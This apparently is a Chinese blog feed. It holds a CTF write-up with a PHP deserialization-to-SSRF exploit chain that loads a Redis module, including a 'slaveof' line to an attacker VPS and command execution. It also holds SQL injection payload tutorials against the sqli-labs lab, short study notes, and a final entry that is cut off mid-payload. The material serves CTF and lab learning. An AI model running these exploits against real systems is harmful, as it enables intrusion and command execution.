            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023春秋杯冬季赛CTF-web</title>
      <link href="/2024/01/15/CTF-2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-CTF-web/"/>
      <url>/2024/01/15/CTF-2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-CTF-web/</url>
      
        <content type="html"><![CDATA[<h2 id="ezezez-php"><a href="#ezezez-php" class="headerlink" title="ezezez_php"></a>ezezez_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;All matters have concluded&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$arg</span>[<span class="number">0</span>][<span class="string">&#x27;POC&#x27;</span>] == <span class="string">&quot;0.o&quot;</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;cl-&gt;var1 = <span class="string">&quot;get&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$payload</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;payload = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;fun = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$paylaod</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Have you genuinely accomplished what you set out to do?&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$paylaod</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;symbol = True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;Flag)))&#123;</span><br><span class="line">               <span class="variable">$value</span>(<span class="variable language_">$this</span>-&gt;Flag);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;NoNoNo,please you can look hint.php&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;start1 . <span class="string">&quot;__construct&quot;</span> . <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start2 === <span class="string">&quot;o.0&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;start1-&gt;<span class="title function_ invoke__">Love</span>(<span class="variable">$this</span>-&gt;start);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You are Good!&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$url</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result_info</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You are Silly goose!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>exp</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ending</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$poc</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cl = <span class="keyword">new</span> <span class="title class_">Er</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;All matters have concluded&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arg</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$arg</span>[<span class="number">0</span>][<span class="string">&#x27;POC&#x27;</span>] == <span class="string">&quot;0.o&quot;</span>) &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;cl-&gt;var1 = <span class="string">&quot;get&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$symbol</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        $this-&gt;Flag = base64_encode(&#x27;dict://127.0.0.1:6379/info&#x27;);</span></span><br><span class="line"><span class="comment">//        $this-&gt;Flag = base64_encode(&#x27;dict://127.0.0.1:6379/config:set:dir:/tmp&#x27;); //设置目录</span></span><br><span class="line"><span class="comment">//        $this-&gt;Flag = base64_encode(&#x27;dict://127.0.0.1:6379/config:get:dir&#x27;); //获取</span></span><br><span class="line"><span class="comment">//        $this-&gt;Flag = base64_encode(&#x27;dict://127.0.0.1:6379/config:set:dbfilename:exp.so&#x27;);</span></span><br><span class="line"><span class="comment">//        $this-&gt;Flag = base64_encode(&#x27;dict://127.0.0.1:6379/slaveof:修改为自己的VPS:2222&#x27;);</span></span><br><span class="line"><span class="comment">//        $this-&gt;Flag = base64_encode(&#x27;dict://127.0.0.1:6379/module:load:./exp.so&#x27;); //加载exp.so</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Flag = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;dict://127.0.0.1:6379/system.exec:&quot;env&quot;&#x27;</span>); <span class="comment">//命令执行</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$this</span>-&gt;Flag)))&#123;</span><br><span class="line">            <span class="variable">$value</span>(<span class="variable language_">$this</span>-&gt;Flag);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;NoNoNo,please you can look hint.php&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*    public function __construct()</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        echo $this-&gt;start1 . &quot;__construct&quot; . &quot;&lt;/br&gt;&quot;;</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start2 === <span class="string">&quot;o.0&quot;</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;start1-&gt;<span class="title function_ invoke__">Love</span>(<span class="variable">$this</span>-&gt;start);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You are Good!&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start1 = <span class="keyword">new</span> <span class="title class_">Rd</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start2 = <span class="string">&quot;o.0&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start = <span class="keyword">array</span>(<span class="string">&quot;POC&quot;</span>=&gt;<span class="string">&quot;0.o&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//SSRF请求</span></span><br><span class="line"><span class="comment">/*function get($url) &#123;</span></span><br><span class="line"><span class="comment">    $url=base64_decode($url);</span></span><br><span class="line"><span class="comment">    var_dump($url);</span></span><br><span class="line"><span class="comment">    $ch = curl_init();</span></span><br><span class="line"><span class="comment">    curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="comment">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span></span><br><span class="line"><span class="comment">    curl_setopt($ch, CURLOPT_HEADER, 0);</span></span><br><span class="line"><span class="comment">    $output = curl_exec($ch);</span></span><br><span class="line"><span class="comment">    $result_info = curl_getinfo($ch);</span></span><br><span class="line"><span class="comment">    var_dump($result_info);</span></span><br><span class="line"><span class="comment">    curl_close($ch);</span></span><br><span class="line"><span class="comment">    var_dump($output);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Ha</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>Redis漏洞利用:<a href="https://www.cnblogs.com/xiaozi/p/13089906.html">https://www.cnblogs.com/xiaozi/p/13089906.html</a><br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;<a href="https://mp.weixin.qq.com/s/Ru8fM_7X9mdG0CiVeKI39Q">https://mp.weixin.qq.com/s/Ru8fM_7X9mdG0CiVeKI39Q</a></p><p>本题讲解:【2024春秋杯冬季赛ezezez_php复现】<a href="https://www.bilibili.com/video/BV1Qe411E75F?vd_source=aa13d69224a955c223f4998b491b80fb">https://www.bilibili.com/video/BV1Qe411E75F?vd_source=aa13d69224a955c223f4998b491b80fb</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记8-计算机网络</title>
      <link href="/2023/11/26/%E5%91%A8%E8%AE%B0-2023-11-26-%E5%91%A8%E8%AE%B08/"/>
      <url>/2023/11/26/%E5%91%A8%E8%AE%B0-2023-11-26-%E5%91%A8%E8%AE%B08/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记7-C语言大作业</title>
      <link href="/2023/11/19/%E5%91%A8%E8%AE%B0-2023-11-19-%E5%91%A8%E8%AE%B07/"/>
      <url>/2023/11/19/%E5%91%A8%E8%AE%B0-2023-11-19-%E5%91%A8%E8%AE%B07/</url>
      
        <content type="html"><![CDATA[<h2 id="C语言大作业"><a href="#C语言大作业" class="headerlink" title="C语言大作业"></a>C语言大作业</h2><p>这周主要以c语言学习和c语言项目开发为主,有时间会在后续更新部分制作过程</p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记8</title>
      <link href="/2023/11/15/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-11-15-%E7%AC%94%E8%AE%B08/"/>
      <url>/2023/11/15/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-11-15-%E7%AC%94%E8%AE%B08/</url>
      
        <content type="html"><![CDATA[<h2 id="产品"><a href="#产品" class="headerlink" title="产品"></a>产品</h2><h3 id="什么是产品"><a href="#什么是产品" class="headerlink" title="什么是产品"></a>什么是产品</h3><p>产品（Product），是用以满足人们需求和欲望的有形物体或无形载体。</p><h3 id="什么是产品经理？"><a href="#什么是产品经理？" class="headerlink" title="什么是产品经理？"></a>什么是产品经理？</h3><p>发现需求-分析需求-解决需求</p><p>体验至上、用户至上</p><p>职责<br>协调所有人和资源向一个正确的方向使劲</p><p>倾听用户需求<br>负责产品功能的定义、规划和设计<br>做各种复杂决策，保证团队顺利开展工作及跟踪程序错误等</p><h3 id="产品经理需要的能力"><a href="#产品经理需要的能力" class="headerlink" title="产品经理需要的能力"></a>产品经理需要的能力</h3><p>思维模型+分析方法</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记6-SQL注入</title>
      <link href="/2023/11/12/%E5%91%A8%E8%AE%B0-2023-11-12-%E5%91%A8%E8%AE%B06/"/>
      <url>/2023/11/12/%E5%91%A8%E8%AE%B0-2023-11-12-%E5%91%A8%E8%AE%B06/</url>
      
        <content type="html"><![CDATA[<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><p>当完成之前所述的步骤,我们就可以开始正式进行注入环节了</p><p>1.步骤1-查询判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">order by 列序号（表示按第几列排序）</span><br><span class="line">1&#x27; order by 1# （不报错）</span><br><span class="line">1&#x27; order by 2# （不报错）</span><br><span class="line">1&#x27; order by 3# （不报错）</span><br><span class="line">1&#x27; order by 4# （报错）</span><br><span class="line">说明结果有3列</span><br></pre></td></tr></table></figure><hr><p><img src="/image.png" alt="Alt text"><br>-1’ union select 1,2,3#<br>id&#x3D;-1表示查不到结果<br>之前知道结果有3列，所以用1,2,3<br>所以只会显示select 1,2,3中的2、3</p><p>2.步骤2-显示数据库名</p><p><img src="/image-1.png" alt="Alt text"></p><p>利用database()函数显示</p><p>3.步骤3-获取这个数据库中的所有表名</p><p><img src="/image-2.png" alt="Alt text"></p><ul><li><p>-1’ union select 1,database(),3#</p></li><li><p>-1’ union select 1,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),3#</p></li><li><p>-1’ union select 1,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 1,1),3#</p></li></ul><p>也可以利用group_concat更简单的操作</p><p><img src="/image-3.png" alt="Alt text"></p><ul><li><p>-1’ union select 1,database(),3#</p></li><li><p>-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),3#</p></li></ul><p>4.步骤4-查询emails表中有哪些列名</p><p><img src="/image-4.png" alt="Alt text"><br>-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’emails’),3#</p><p>5.步骤5-查emails表中的email_id</p><p><img src="/image-5.png" alt="Alt text"></p><p>-1’ union select 1,(select email_id from emails limit 0, 1),3#</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1.步骤1：使用extractvalue攻击获取数据库名<br><img src="/image-6.png" alt="Alt text"></p><p>2.步骤2-获取表名</p><p>‘ and extractvalue(‘div’, concat(‘~’,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’)))#<br><img src="/image-7.png" alt="Alt text"></p><p>3.步骤3-获取列名</p><p>‘ and extractvalue(‘div’, concat(‘~’,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’emails’)))#<br><img src="/image-8.png" alt="Alt text"></p><p>4.步骤4-获取邮箱数据</p><p>‘ and extractvalue(‘div’, concat(‘~’,(select email_id from emails limit 0,1)))#</p><p><img src="/image-9.png" alt="Alt text"></p><p>使用updatexml攻击获取数据库名</p><p>‘ and updatexml(‘div’, concat(‘~’,database()), ‘hi’)#<br><img src="/image-10.png" alt="Alt text"></p><h3 id="布尔注入-盲注"><a href="#布尔注入-盲注" class="headerlink" title="布尔注入(盲注)"></a>布尔注入(盲注)</h3><p>库名的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">有：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1%23</span></span><br><span class="line"><span class="string">有： http://localhost/sqli-labs/Less-8/?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;=</span><span class="number">8</span><span class="operator">%</span><span class="number">23</span></span><br><span class="line">没有：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;=9%23</span></span><br><span class="line"><span class="string">说明库名长度是8！</span></span><br></pre></td></tr></table></figure><p>暴破库名的每个字符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">没有：http:<span class="operator">/</span><span class="operator">/</span>localhost<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-8</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 